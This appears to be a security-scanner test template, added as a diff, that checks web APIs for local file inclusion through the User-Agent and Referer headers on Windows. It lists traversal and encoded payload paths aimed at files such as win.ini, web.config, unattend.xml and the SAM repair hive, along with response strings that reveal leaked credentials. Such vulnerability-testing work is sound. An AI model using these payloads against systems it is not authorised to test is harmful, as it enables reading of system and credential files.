@@ -1,0 +1,109 @@
+id: LFI_IN_HEADERS_WINDOWS
+info:
+  name: "LFI in Headers for Windows"
+  description: "Local File Inclusion (LFI) in headers on Windows occurs when web applications improperly handle HTTP headers that allow user input to dictate file paths. Attackers can exploit this vulnerability by crafting malicious requests that include file path information in headers such as `User-Agent` or `Referer`. If the application fails to validate or sanitize these headers, it may inadvertently include sensitive files from the server’s file system, leading to information disclosure and potential further exploitation. This type of attack can expose critical data, including configuration files or user credentials, compromising the security of the application." 
+  details: "Local File Inclusion (LFI) in headers for Windows involves exploiting web applications that accept user-defined values in HTTP headers without proper validation. Attackers can manipulate headers like `User-Agent`, `Referer`, or custom headers to include file paths, often utilizing directory traversal techniques (e.g., `..\\`). If the application processes these headers to include files without proper sanitization, it can inadvertently expose sensitive files, such as system configurations, log files, or application data. This exploitation can serve as a gateway for further attacks, escalating the risk to the entire system."
+  impact: "The impact of Local File Inclusion (LFI) through headers on Windows can be significant, as it may lead to unauthorized access to sensitive files, including system configurations, credentials, or user data. This exposure can result in data breaches, allowing attackers to gather critical information for further exploitation or privilege escalation. Additionally, if the vulnerability enables the inclusion of executable files, it could lead to remote code execution, potentially compromising the entire system and giving attackers full control over it. Such incidents can severely damage an organization’s reputation and lead to financial losses."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: LFI_IN_HEADERS_WINDOWS
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2022-29597
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  request_headers:
+    for_one:
+      key:
+        regex: ^user-agent|referer$
+        extract: header_key
+  response_payload:
+    length:
+      gt: 0
+
+wordLists:
+  filePaths: 
+    - "/boot.ini"
+    - "/inetpub/logs/logfiles"
+    - "/inetpub/wwwroot/global.asa"
+    - "/inetpub/wwwroot/index.asp"
+    - "/inetpub/wwwroot/web.config"
+    - "/sysprep.inf"
+    - "/sysprep.xml"
+    - "/sysprep/sysprep.inf"
+    - "/sysprep/sysprep.xml"
+    - "/system volume information/wpsettings.dat"
+    - "/system32/inetsrv/metabase.xml"
+    - "/unattend.txt"
+    - "/unattend.xml"
+    - "/unattended.txt"
+    - "/unattended.xml"
+    - "/windows/repair/sam"
+    - "/windows/repair/system"
+    - "../../../../../../windows/win.ini"
+    - "..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
+    - "%252e%252e%252f%252e%252e%252fwindows%252fwin.ini"
+    - "../../../../../../boot.ini"
+    - "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini"
+    - "../../../../../../inetpub/wwwroot/web.config"
+    - "../../../../../../inetpub/wwwroot/global.asa"
+    - "../../../../../../windows/system32/drivers/etc/hosts"
+    - "../../../../../../windows/win.ini%00.txt"
+
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_header:
+          header_key: ${filePaths}
+
+validate:
+  response_payload:
+    length:
+      gt: 0
+    contains_either:
+      - "[boot loader]"
+      - "[operating systems]"
+      - "multi(0)"
+      - "partition(1)"
+      - "<SCRIPT LANGUAGE=VBScript RUNAT=Server>"
+      - "Application_OnStart"
+      - "Session_OnEnd"
+      - "ConnectionString"
+      - "Server.MapPath"
+      - "Request.QueryString"
+      - "Response.Write"
+      - "<connectionStrings>"
+      - "<appSettings>"
+      - "<authentication mode="
+      - "<authorization>"
+      - "<identity impersonate="
+      - "ProductKey="
+      - "AdminPassword="
+      - "FullName="
+      - "ComputerName="
+      - "<ProductKey>"
+      - "<AdministratorPassword>"
+      - "<ComputerName>"
+      - "<IISConfigObject>"
+      - "AdminACL"
+      - "AccessFlags"
+      - "C:\\Windows\\win.ini"
+      - "[windows]"
+      - "NullPort="
+      - "C:\\boot.ini"
+      - "multi(0)disk(0)rdisk(0)"
